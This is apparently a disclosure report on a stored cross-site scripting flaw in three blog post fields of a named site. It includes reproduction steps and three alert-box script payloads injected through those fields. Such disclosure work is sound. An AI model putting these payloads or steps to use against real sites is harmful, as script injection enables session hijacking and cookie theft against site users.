# Stored Cross-Site Scripting (XSS) via Blog Post Fields

## Summary

A Stored Cross-Site Scripting (XSS) vulnerability exists in the blog post functionality of the application. User-controlled input submitted through the `Post Title`, `Excerpt`, and `Post Content` fields is stored and rendered without proper sanitization, allowing persistent JavaScript execution in users’ browsers.

---

## Vulnerable Endpoint

```text id="m4q1xa"
http://kzlabs.com/20.php
```

---

## Vulnerable Input Fields

```text id="r7k2wn"
Post Title
Excerpt
Post Content
```

---

## Payloads Used

### Post Title

```html id="h3p8ze"
"xicorr><sCript>alert("xicorXSS1")</sCript>
```

### Excerpt

```html id="n5v1la"
"xicorr><sCript>alert("xicorXSS2")</sCript>
```

### Post Content

```html id="q8c4yb"
"xicorr><sCript>alert("xicorXSS3")</sCript>
```

---

## Steps to Reproduce

1. Open the following page in a browser:

   ```text
   http://kzlabs.com/20.php
   ```

2. Enter the payloads into the `Post Title`, `Excerpt`, and `Post Content` fields.

3. Publish the blog post.

4. Observe that the payloads are stored and executed when the blog content is rendered.

---

## Proof of Concept

```text id="u2f9rd"
http://kzlabs.com/20.php
```

### Screenshots

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/86a815df-9cd4-480a-9b68-251b7a8c24db" />
<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/ed85d55d-fc29-48c4-b60b-71b054e655d7" />
<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/cb26dc18-4d10-485d-aab7-b9262ddceb2e" />


---

## Impact

* Session hijacking
* Cookie theft
* Persistent JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Sanitize stored content
* Secure rendering
